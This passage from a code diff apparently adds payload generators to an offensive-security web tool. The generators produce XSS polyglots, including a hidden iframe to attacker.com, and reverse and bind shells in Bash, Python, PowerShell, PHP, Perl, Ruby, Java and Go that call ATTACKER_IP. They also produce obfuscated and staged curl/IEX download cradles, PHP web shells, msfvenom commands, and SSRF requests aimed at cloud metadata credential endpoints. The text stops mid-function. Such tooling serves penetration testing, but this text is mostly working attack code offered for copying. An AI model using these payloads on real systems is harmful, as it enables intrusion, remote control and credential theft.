+                        payload: "<script>document.body.innerHTML='<h1>Hacked</h1>'<\/script>",
+                        contexts: ["html", "js"]
+                     },
+                     {
+                        name: "HTML/JS/Attribute Deface",
+                        payload: "javascript:\"/*'/*`/*--></noscript></title></textarea></style></template></noembed><\/script><html \"onmouseover=/*&lt;svg/*/onload=document.body.innerHTML='<h1>Hacked</h1>'//>",
+                        contexts: ["html", "js", "attribute"]
+                     }
+                 ];
+            } else if (action === 'iframe') {
+                 const iframeUrl = params || 'https://attacker.com/evil.html';
+                 polyglots = [
+                     {
+                        name: "HTML/JS Hidden Iframe",
+                        payload: "<script>var f=document.createElement('iframe');f.src='"+iframeUrl+"';f.style.display='none';document.body.appendChild(f);<\/script>",
+                        contexts: ["html", "js"]
+                     },
+                     {
+                        name: "HTML/JS/Attribute Hidden Iframe",
+                        payload: "javascript:\"/*'/*`/*--></noscript></title></textarea></style></template></noembed><\/script><html \"onmouseover=/*&lt;svg/*/onload=var f=document.createElement('iframe');f.src='"+iframeUrl+"';f.style.display='none';document.body.appendChild(f);//>",
+                        contexts: ["html", "js", "attribute"]
+                     }
+                 ];
+            }
+            // --- End of Polyglot Generation Logic ---
+
+            if (polyglots.length > 0) {
+                polyglots.forEach(polyglot => {
+                    // Check if this polyglot supports all requested technologies
+                    const matchesTechs = technologies.every(tech => polyglot.contexts.includes(tech));
+                    if (technologies.length === 0 || matchesTechs) { // Show if no tech selected or if it matches all selected
+                        output += `<div class="mb-3">
+                            <div class="text-sm text-green-400 mb-1">${escapeHTML(polyglot.name)} (Works in: ${polyglot.contexts.join(', ')})</div>
+                            <pre class="clickable" onclick="copyToClipboard('${escapeHTML(polyglot.payload)}')">${escapeHTML(polyglot.payload)}</pre>
+                        </div>`;
+                    }
+                });
+            } else {
+                 output += '<div class="text-gray-500">No polyglots generated for this action/technology combination yet.</div>';
+            }
+
+            // Add Advanced Polyglots section (display only)
+            output += `<div class="text-yellow-400 font-bold mt-4 mb-2">Advanced Polyglot Constructs (Examples):</div>`;
+            const advancedPolyglots = [
+                { name: "Filter Evasion", payload: "<!--><svg onload=alert(1)>-->", desc: "Uses HTML comments" },
+                { name: "Event Handler Chain", payload: "<iframe src=\"javascript:alert(1)\" onload=\"this.contentWindow.location='data:text/html,<script>alert(2)<\\/script>'\" onerror=\"alert(3)\">", desc: "Multiple trigger points" },
+                { name: "Unicode Normalization", payload: "<A HREF=\"javascript&colon;alert(1)\">ＸＳＳ</A>", desc: "Uses Unicode lookalikes/equivalents" },
+                { name: "CSS/JS Animation", payload: "<\/script><style>@keyframes x{}</style><div style=\"animation-name:x\" onanimationstart=\"alert(1)\"></div>", desc: "CSS animation triggers JS" },
+                { name: "Protocol Handler Obfuscation", payload: "javascript:/**/eval(atob('YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=='))//", desc: "Uses encoding/comments" }
+            ];
+            advancedPolyglots.forEach(polyglot => {
+                output += `<div class="mb-3">
+                    <div class="text-sm text-green-400 mb-1">${escapeHTML(polyglot.name)}</div>
+                    <div class="text-xs text-gray-500 mb-1">${escapeHTML(polyglot.desc)}</div>
+                    <pre class="clickable" onclick="copyToClipboard('${escapeHTML(polyglot.payload)}')">${escapeHTML(polyglot.payload)}</pre>
+                </div>`;
+            });
+
+
+            document.getElementById('polyglot_output').innerHTML = output;
+        }
+
+        function generateShell() {
+            const type = document.getElementById('shell_type').value;
+            const language = document.getElementById('shell_language').value;
+            const ip = document.getElementById('shell_ip').value.trim() || 'ATTACKER_IP';
+            const port = document.getElementById('shell_port').value.trim() || 'PORT';
+            const obfuscate = document.getElementById('shell_obfuscate').checked;
+            const staged = document.getElementById('shell_stage').checked;
+
+            let output = `<div class="text-yellow-400 font-bold mb-2">${escapeHTML(type.charAt(0).toUpperCase() + type.slice(1))} Shell Payloads (${escapeHTML(language.toUpperCase())}):</div>`;
+            let payloads = [];
+            let listenerCommand = '';
+
+            // --- Shell Generation Logic ---
+            if (type === 'reverse') {
+                listenerCommand = `nc -lvnp ${port}`; // Basic listener
+                if (language === 'bash') {
+                    payloads = [
+                        { name: "Basic TCP", payload: `bash -i >& /dev/tcp/${ip}/${port} 0>&1` },
+                        { name: "Alternative TCP", payload: `exec /bin/bash 0</dev/tcp/${ip}/${port} 1>&0 2>&0` },
+                        { name: "With /dev/tcp Check", payload: `bash -c 'if [ -e /dev/tcp ]; then bash -i >& /dev/tcp/${ip}/${port} 0>&1; fi'`},
+                        { name: "UDP (requires nc listener with -u)", payload: `sh -i >& /dev/udp/${ip}/${port} 0>&1` },
+                        { name: "File Descriptor", payload: `0<&196;exec 196<>/dev/tcp/${ip}/${port}; /bin/sh <&196 >&196 2>&196` },
+                    ];
+                    if (obfuscate) {
+                        payloads.push({ name: "Base64 Encoded", payload: `echo $(echo -n 'bash -i >& /dev/tcp/${ip}/${port} 0>&1' | base64) | base64 -d | bash` });
+                        payloads.push({ name: "Hex Encoded", payload: `bash -c 'eval "$(echo -e "\\x62\\x61\\x73\\x68\\x20\\x2d\\x69\\x20\\x3e\\x26\\x20\\x2f\\x64\\x65\\x76\\x2f\\x74\\x63\\x70\\x2f${ip.split('').map(c => '\\x'+c.charCodeAt(0).toString(16)).join('')}\\x2f${port.split('').map(c => '\\x'+c.charCodeAt(0).toString(16)).join('')}\\x20\\x30\\x3e\\x26\\x31")"'` });
+                    }
+                    if (staged) {
+                        payloads.push({ name: "Staged (curl)", payload: `curl -s http://${ip}:8000/stage.sh | bash` });
+                        payloads.push({ name: "Staged (wget)", payload: `wget -qO- http://${ip}:8000/stage.sh | bash` });
+                        listenerCommand += `\n# Serve stage.sh: python3 -m http.server 8000`;
+                    }
+                } else if (language === 'python') {
+                     payloads = [
+                        { name: "Python3 Basic", payload: `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'` },
+                        { name: "Python3 PTY", payload: `python3 -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'` },
+                        { name: "Python2 Basic", payload: `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'` },
+                     ];
+                     if (obfuscate) {
+                         const py_payload = `import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])`;
+                         payloads.push({ name: "Base64 Encoded (Python3)", payload: `python3 -c 'import base64;exec(base64.b64decode("${btoa(py_payload)}"))'` });
+                     }
+                     if (staged) {
+                         payloads.push({ name: "Staged (Python3 urllib)", payload: `python3 -c 'import urllib.request;exec(urllib.request.urlopen("http://${ip}:8000/stage.py").read().decode())'` });
+                         listenerCommand += `\n# Serve stage.py: python3 -m http.server 8000`;
+                     }
+                } else if (language === 'powershell') {
+                     listenerCommand = `nc -lvnp ${port}`; // Or use Powercat/Nishang listener
+                     payloads = [
+                        { name: "Basic TCPClient", payload: `$client = New-Object System.Net.Sockets.TCPClient('${ip}',${port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()` },
+                        { name: "Shorter TCPClient", payload: `$s=New-Object Net.Sockets.TCPClient('${ip}',${port});$st=$s.GetStream();[byte[]]$b=0..65535|%{0};while(($r=$st.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$r);$o=(iex $d 2>&1|Out-String);$ob=([Text.ASCIIEncoding]::ASCII).GetBytes($o+'PS '+(pwd).Path+'> ');$st.Write($ob,0,$ob.Length);$st.Flush()};$s.Close()` },
+                        { name: "Invoke-PowerShellTcp (Nishang)", payload: `powershell -c "IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress ${ip} -Port ${port}"` },
+                     ];
+                     if (obfuscate) {
+                         const ps_payload = `$client = New-Object System.Net.Sockets.TCPClient('${ip}',${port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`;
+                         const encoded_ps = Buffer.from(ps_payload, 'utf16le').toString('base64');
+                         payloads.push({ name: "Base64 Encoded", payload: `powershell -e ${encoded_ps}` });
+                     }
+                     if (staged) {
+                         payloads.push({ name: "Staged (IEX DownloadString)", payload: `powershell -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://${ip}:8000/stage.ps1')"` });
+                         listenerCommand += `\n# Serve stage.ps1: python3 -m http.server 8000`;
+                     }
+                } else if (language === 'perl') {
+                     payloads = [
+                        { name: "Basic", payload: `perl -e 'use Socket;$i="${ip}";$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'` },
+                        { name: "Alternative", payload: `perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"${ip}:${port}");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'` },
+                     ];
+                     if (obfuscate) {
+                         const perl_payload = `use Socket;$i="${ip}";$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};`;
+                         payloads.push({ name: "Hex Encoded", payload: `perl -e 'eval(pack("H*","${Buffer.from(perl_payload).toString('hex')}"))'` });
+                     }
+                } else if (language === 'php') {
+                     payloads = [
+                        { name: "fsockopen", payload: `php -r '$sock=fsockopen("${ip}",${port});exec("/bin/sh -i <&3 >&3 2>&3");'` },
+                        { name: "stream_socket_client", payload: `php -r '$s=stream_socket_client("tcp://${ip}:${port}");stream_set_blocking($s,0);proc_open("/bin/sh -i", array(0=>$s, 1=>$s, 2=>$s),$p);'` },
+                        { name: "PentestMonkey", payload: `php -r '$ip = "${ip}"; $port = ${port}; $sock = fsockopen($ip, $port); $proc = proc_open("/bin/sh -i", array(0 => $sock, 1 => $sock, 2 => $sock), $pipes);'` },
+                     ];
+                     if (obfuscate) {
+                         const php_payload = `$sock=fsockopen("${ip}",${port});exec("/bin/sh -i <&3 >&3 2>&3");`;
+                         payloads.push({ name: "Base64 Encoded", payload: `php -r 'eval(base64_decode("${btoa(php_payload)}"));'` });
+                     }
+                     if (staged) {
+                         payloads.push({ name: "Staged (file_get_contents)", payload: `php -r 'eval(file_get_contents("http://${ip}:8000/stage.php"));'` });
+                         listenerCommand += `\n# Serve stage.php: python3 -m http.server 8000`;
+                     }
+                } else if (language === 'ruby') {
+                     payloads = [
+                        { name: "Basic", payload: `ruby -rsocket -e'f=TCPSocket.open("${ip}",${port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'` },
+                        { name: "Alternative", payload: `ruby -rsocket -e 'exit if fork;c=TCPSocket.new("${ip}","${port}");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'` },
+                     ];
+                     if (obfuscate) {
+                         const ruby_payload = `f=TCPSocket.open("${ip}",${port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)`;
+                         payloads.push({ name: "Base64 Encoded", payload: `ruby -e 'eval([\"${Buffer.from(ruby_payload).toString('base64')}\"].pack(\"m0\"))'` });
+                     }
+                } else if (language === 'nc') {
+                     payloads = [
+                        { name: "Netcat OpenBSD (-e)", payload: `nc -e /bin/sh ${ip} ${port}` },
+                        { name: "Netcat Traditional (-e)", payload: `nc.traditional -e /bin/sh ${ip} ${port}` },
+                        { name: "Netcat without -e (mkfifo)", payload: `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${ip} ${port} >/tmp/f` },
+                        { name: "Ncat (-e)", payload: `ncat ${ip} ${port} -e /bin/bash` },
+                     ];
+                } else if (language === 'java') {
+                     payloads = [
+                        { name: "Basic", payload: `Runtime.getRuntime().exec("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xLzQ0NDQgMD4mMQ==}|{base64,-d}|{bash,-i}");`}, // Needs IP/Port encoded in base64
+                        { name: "ProcessBuilder", payload: `new ProcessBuilder("/bin/bash", "-c", "bash -i >& /dev/tcp/${ip}/${port} 0>&1").start();` },
+                        { name: "Complex (Needs Compilation)", payload: `// Requires full Java code, e.g.:\nString host="${ip}";\nint port=${port};\nString cmd="/bin/bash";\nProcess p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();` },
+                     ];
+                } else if (language === 'go') {
+                     payloads = [
+                        { name: "Basic (Needs Compilation)", payload: `echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","${ip}:${port}");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/s.go && go run /tmp/s.go && rm /tmp/s.go` },
+                     ];
+                } else if (language === 'csharp') {
+                     payloads = [
+                        { name: "Basic (Needs Compilation/Execution Context)", payload: `// Example using System.Diagnostics.Process\nSystem.Diagnostics.Process process = new System.Diagnostics.Process();\nSystem.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();\nstartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;\nstartInfo.FileName = "cmd.exe";\nstartInfo.Arguments = "/C powershell -nop -c \\"$client = New-Object System.Net.Sockets.TCPClient('${ip}',${port});[...]\\";"; // Embed PowerShell reverse shell\nprocess.StartInfo = startInfo;\nprocess.Start();` },
+                     ];
+                }
+
+            } else if (type === 'bind') {
+                 listenerCommand = `nc ${ip} ${port}`; // Connect to the target
+                 if (language === 'nc') {
+                     payloads = [
+                        { name: "Netcat OpenBSD (-l -p -e)", payload: `nc -l -p ${port} -e /bin/sh` },
+                        { name: "Netcat Traditional (-l -p -e)", payload: `nc.traditional -l -p ${port} -e /bin/sh` },
+                        { name: "Ncat (-l -p -e)", payload: `ncat -l -p ${port} -e /bin/bash` },
+                        { name: "Ncat (--allow)", payload: `ncat --allow ${ip} -lvp ${port} -e /bin/bash` }, // Allow specific IP
+                     ];
+                 } else if (language === 'python') {
+                     payloads = [
+                        { name: "Python3 Basic Bind", payload: `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind(("",${port}));s.listen(1);conn,addr=s.accept();os.dup2(conn.fileno(),0);os.dup2(conn.fileno(),1);os.dup2(conn.fileno(),2);subprocess.call(["/bin/sh","-i"])'` },
+                     ];
+                 } else if (language === 'php') {
+                     payloads = [
+                        { name: "PHP Bind (Requires interactive shell)", payload: `php -r '$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($s,"0.0.0.0",${port});socket_listen($s,1);$cl=socket_accept($s);while(1){$i=socket_read($cl,1024);$o=shell_exec($i);socket_write($cl,$o,strlen($o));}'` },
+                     ];
+                 }
+                 // Add more bind shells...
+
+            } else if (type === 'web') {
+                 listenerCommand = `# Access the webshell via browser: http://TARGET_IP/path/to/shell.php?cmd=whoami`;
+                 if (language === 'php') {
+                     payloads = [
+                        { name: "Simple Command Execution", payload: `<?php system($_GET['cmd']); ?>` },
+                        { name: "Slightly Better Command Execution", payload: `<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>` },
+                        { name: "Passthru", payload: `<?php passthru($_GET['cmd']); ?>` },
+                        { name: "Exec", payload: `<?php echo exec($_GET['cmd']); ?>` },
+                        { name: "Shell Exec", payload: `<?php echo shell_exec($_GET['cmd']); ?>` },
+                        { name: "Backticks", payload: "<?php echo `{$_GET['cmd']}`; ?>" },
+                        { name: "Preg Replace (RCE)", payload: `<?php preg_replace('/.*/e', $_REQUEST['cmd'], ''); ?>` }, // Dangerous, often disabled
+                        { name: "File Upload", payload: `<?php if(isset($_FILES['file'])){ move_uploaded_file($_FILES['file']['tmp_name'], $_FILES['file']['name']); echo "Uploaded!"; } else { echo '<form method="post" enctype="multipart/form-data"><input type="file" name="file"><input type="submit" value="Upload"></form>'; } ?>` },
+                     ];
+                     if (obfuscate) {
+                         payloads.push({ name: "Obfuscated (Hex Chars)", payload: `<?php ${"\\x73\\x79\\x73\\x74\\x65\\x6d"}(${"\\x5f\\x47\\x45\\x54"}["${"\\x63\\x6d\\x64"}"]); ?>` });
+                         payloads.push({ name: "Base64 Eval", payload: `<?php eval(base64_decode('c3lzdGVtKCRfR0VUWyJjbWQiXSk7')); ?>` }); // system($_GET["cmd"]);
+                     }
+                 } else if (language === 'python') { // e.g., Flask/Django
+                     payloads = [
+                        { name: "Flask Simple RCE", payload: `from flask import Flask, request\nimport os\napp = Flask(__name__)\n@app.route('/')\ndef index():\n    cmd = request.args.get('cmd')\n    if cmd:\n        return os.popen(cmd).read()\n    return 'OK'\napp.run(host='0.0.0.0', port=80)` },
+                     ];
+                 }
+                 // Add more web shells (ASP, JSP, etc.)
+
+            } else if (type === 'meterpreter') {
+                 listenerCommand = `msfconsole -q -x "use exploit/multi/handler; set PAYLOAD <payload_type>; set LHOST ${ip || '0.0.0.0'}; set LPORT ${port}; run"`
+                 let payload_type = '';
+                 if (language === 'windows' || language === 'powershell' || language === 'csharp') { // Assuming Windows target
+                     payload_type = staged ? 'windows/meterpreter/reverse_tcp' : 'windows/meterpreter_reverse_tcp';
+                     payloads = [
+                        { name: "Generate with msfvenom (Staged)", payload: `msfvenom -p windows/meterpreter/reverse_tcp LHOST=${ip} LPORT=${port} -f exe -o shell.exe` },
+                        { name: "Generate with msfvenom (Stageless)", payload: `msfvenom -p windows/meterpreter_reverse_tcp LHOST=${ip} LPORT=${port} -f exe -o shell_stageless.exe` },
+                        { name: "PowerShell (IEX Download Cradle)", payload: `powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://${ip}:8000/met.ps1')"` },
+                     ];
+                     listenerCommand = listenerCommand.replace('<payload_type>', payload_type);
+                 } else { // Assuming Linux target
+                     payload_type = staged ? 'linux/x64/meterpreter/reverse_tcp' : 'linux/x64/meterpreter_reverse_tcp'; // Default to x64
+                     payloads = [
+                        { name: "Generate with msfvenom (Staged)", payload: `msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=${ip} LPORT=${port} -f elf -o shell.elf` },
+                        { name: "Generate with msfvenom (Stageless)", payload: `msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=${ip} LPORT=${port} -f elf -o shell_stageless.elf` },
+                        { name: "Python Stager", payload: `msfvenom -p python/meterpreter/reverse_tcp LHOST=${ip} LPORT=${port} -f raw -o met.py` },
+                     ];
+                     listenerCommand = listenerCommand.replace('<payload_type>', payload_type);
+                 }
+                 if (staged) {
+                     listenerCommand += `\n# If using download cradle, serve the payload: python3 -m http.server 8000`;
+                 }
+
+            } else if (type === 'encoded') {
+                 listenerCommand = `nc -lvnp ${port}`;
+                 if (language === 'bash') {
+                     payloads = [
+                        { name: "Base64", payload: `echo $(echo -n 'bash -i >& /dev/tcp/${ip}/${port} 0>&1' | base64) | base64 -d | bash` },
+                        { name: "Hex", payload: `bash -c 'eval "$(echo -e "\\x62\\x61\\x73\\x68\\x20\\x2d\\x69\\x20\\x3e\\x26\\x20\\x2f\\x64\\x65\\x76\\x2f\\x74\\x63\\x70\\x2f${ip.split('').map(c => '\\x'+c.charCodeAt(0).toString(16)).join('')}\\x2f${port.split('').map(c => '\\x'+c.charCodeAt(0).toString(16)).join('')}\\x20\\x30\\x3e\\x26\\x31")"'` },
+                     ];
+                 } else if (language === 'powershell') {
+                     const ps_payload = `$client = New-Object System.Net.Sockets.TCPClient('${ip}',${port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`;
+                     const encoded_ps = Buffer.from(ps_payload, 'utf16le').toString('base64');
+                     payloads = [ { name: "Base64 Encoded (-e)", payload: `powershell -e ${encoded_ps}` } ];
+                 }
+                 // Add more encoded types
+
+            } else if (type === 'fileless') {
+                 listenerCommand = `nc -lvnp ${port}`;
+                 if (language === 'bash') { // Linux specific
+                     payloads = [
+                        { name: "In-Memory Execution (Perl)", payload: `perl -e 'use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in(${port},inet_aton("${ip}")))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'` },
+                        { name: "In-Memory Execution (Python)", payload: `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'` },
+                        { name: "Memfd_create + /dev/tcp", payload: `bash -c 'exec 3<>/dev/tcp/${ip}/${port}; cat <&3 | /proc/$$/exe -i >&3 2>&3'` }, // Executes current bash in memory
+                     ];
+                 } else if (language === 'powershell') { // Windows specific
+                     payloads = [
+                        { name: "Reflective PE Injection (Invoke-ReflectivePEInjection)", payload: `# Requires PowerSploit\nIEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-ReflectivePEInjection.ps1'); Invoke-ReflectivePEInjection -PEUrl http://${ip}:8000/payload.dll -procname notepad.exe` },
+                        { name: "Invoke-Shellcode", payload: `# Requires PowerSploit\nIEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-Shellcode.ps1'); Invoke-Shellcode -Payload (New-Object Net.WebClient).DownloadData('http://${ip}:8000/payload.bin')` },
+                     ];
+                     listenerCommand += `\n# Serve payload.dll/bin: python3 -m http.server 8000`;
+                 }
+            }
+            // --- End of Shell Generation Logic ---
+
+            if (payloads.length > 0) {
+                if (listenerCommand) {
+                    output += `<div class="mb-3">
+                        <div class="text-sm text-green-400 mb-1">Listener Command:</div>
+                        <pre class="clickable" onclick="copyToClipboard('${escapeHTML(listenerCommand)}')">${escapeHTML(listenerCommand)}</pre>
+                    </div>`;
+                }
+                payloads.forEach((p, index) => {
+                    output += `<div class="mb-2">
+                        <div class="text-sm text-gray-500 mb-1">${escapeHTML(p.name)}:</div>
+                        <pre class="clickable" onclick="copyToClipboard('${escapeHTML(p.payload)}')">${escapeHTML(p.payload)}</pre>
+                    </div>`;
+                });
+            } else {
+                 output += '<div class="text-gray-500">No payloads generated for this combination yet.</div>';
+            }
+
+            document.getElementById('shell_output').innerHTML = output;
+        }
+
+        function generateSSRF() {
+            const env = document.getElementById('ssrf_env').value;
+            const technique = document.getElementById('ssrf_technique').value;
+            const customTargetInput = document.getElementById('ssrf_target').value.trim();
+
+            let output = `<div class="text-yellow-400 font-bold mb-2">SSRF Payloads for ${escapeHTML(env.toUpperCase())} (${escapeHTML(technique)}):</div>`;
+            let baseTargets = [];
+            let headers = {};
+
+            // --- SSRF Target Definition ---
+            switch (env) {
+                case 'aws':
+                    baseTargets = [
+                        'http://169.254.169.254/latest/meta-data/',
+                        'http://169.254.169.254/latest/user-data',
+                        'http://169.254.169.254/latest/meta-data/iam/security-credentials/', // Needs role name appended
+                        'http://169.254.169.254/latest/dynamic/instance-identity/document'
+                    ];
+                    break;
+                case 'gcp':
+                    baseTargets = [
+                        'http://metadata.google.internal/computeMetadata/v1/instance/hostname',
+                        'http://metadata.google.internal/computeMetadata/v1/instance/id',
+                        'http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env', // GKE specific
+                        'http://metadata.google.internal/computeMetadata/v1/project/project-id',
+                        'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token' // Get access token
+                    ];
+                    headers['Metadata-Flavor'] = 'Google';
+                    break;
+                case 'azure':
+                     baseTargets = [
+                        'http://169.254.169.254/metadata/instance?api-version=2021-02-01',
+                        'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/' // Get Managed Identity token
+                    ];
+                    headers['Metadata'] = 'true';
+                    break;
+                case 'docker':
+                    baseTargets = [
+                        `http://${customTargetInput || 'localhost'}:2375/v1.41/containers/json`, // Default Docker API port
+                        `http://${customTargetInput || 'localhost'}:2375/v1.41/images/json`,
+                        `http://${customTargetInput || 'localhost'}:2375/v1.41/info`,
+                    ];
+                    break;
+                case 'kubernetes':
+                     baseTargets = [
+                        `https://${customTargetInput || 'kubernetes.default.svc'}:443/api/v1/namespaces/default/secrets`, // Needs token/auth usually
+                        `https://${customTargetInput || 'kubernetes.default.svc'}:443/api/v1/nodes`,
+                        `http://localhost:10250/pods` // Kubelet read-only API (if accessible)
+                     ];
+                     break;
+                case 'etcd':
+                     baseTargets = [
+                        `http://${customTargetInput || 'localhost'}:2379/v2/keys/?recursive=true`,
+                        `http://${customTargetInput || 'localhost'}:2379/v2/stats/self`,
+                     ];
+                     break;
+                case 'redis':
+                     baseTargets = [
+                        `redis://${customTargetInput || 'localhost'}:6379/info`, // Requires URL parser understanding redis://
+                        `gopher://${customTargetInput || 'localhost'}:6379/_INFO%0d%0aQUIT%0d%0a`, // Gopher alternative
+                        `gopher://${customTargetInput || 'localhost'}:6379/_SLAVEOF%20attacker-redis-server%206379%0d%0aQUIT%0d%0a`, // Make it a slave (dangerous)
+                     ];
+                     break;
+                 case 'internal':
+                     const internalIP = customTargetInput || '192.168.1.100'; // Example internal IP
+                     baseTargets = [
+                        `http://${internalIP}:80/`,
+                        `http://${internalIP}:8080/`, // Common alt HTTP
+                        `http://${internalIP}:8000/`,
+                        `http://${internalIP}:443/`, // HTTPS might fail if not supported by SSRF sink
+                        `http://${internalIP}:22/`, // Check SSH port banner
+                        `http://${internalIP}:21/`, // Check FTP port banner
+                        `http://${internalIP}:25/`, // Check SMTP port banner
+                        `http://${internalIP}:3306/`, // Check MySQL port banner
+                        `http://${internalIP}:5432/`, // Check Postgres port banner
+                        `http://${internalIP}:6379/`, // Check Redis port banner
+                     ];
+                     break;
+                case 'custom':
+                    if (customTargetInput) {
+                        // Assume http if no protocol provided
+                        baseTargets = [customTargetInput.startsWith('http') ? customTargetInput : `http://${customTargetInput}`];
+                    } else {
+                        output += '<div class="text-red-500">Please provide a Target IP/Hostname for Custom Target.</div>';
+                        document.getElementById('ssrf_output').innerHTML = output;
+                        return;
+                    }
+                    break;
+            }
+            // --- End SSRF Target Definition ---
+
+
+            let finalPayloads = [];
+
+            // --- SSRF Technique Application ---
+            baseTargets.forEach(baseTarget => {
+                let url;
+                try {
+                    url = new URL(baseTarget); // Use URL parser for easier manipulation
+                } catch (e) {
+                    console.warn("Invalid base target URL:", baseTarget, e);
+                    // If URL parsing fails, treat it as a simple string for some techniques
+                    url = { protocol: '', hostname: baseTarget, port: '', pathname: '', search: '', hash: '', href: baseTarget };
+                     if (baseTarget.includes(':')) {
+                         const parts = baseTarget.split(':');
+                         url.protocol = parts[0] + ':';
+                         if (parts[1].startsWith('//')) {
+                             const hostPortPath = parts[1].substring(2).split('/');
+                             const hostPort = hostPortPath[0].split(':');
+                             url.hostname = hostPort[0];
+                             url.port = hostPort[1] || '';
+                             url.pathname = '/' + (hostPortPath.slice(1).join('/') || '');
+                         }
+                     }
+                }
+
+                const protocol = url.protocol || 'http:';
+                const hostname = url.hostname;
+                const port = url.port || (protocol === 'https:' ? '443' : '80'); // Default port
+                const path = (url.pathname || '/') + url.search + url.hash;
+
+                switch (technique) {
+                    case 'standard':
+                        finalPayloads.push(baseTarget);
+                        break;
+                    case 'ip_encode':
+                        if (/^[\d\.]+$/.test(hostname)) { // Only for IP addresses
+                            const parts = hostname.split('.');
+                            if (parts.length === 4) {
+                                // Decimal
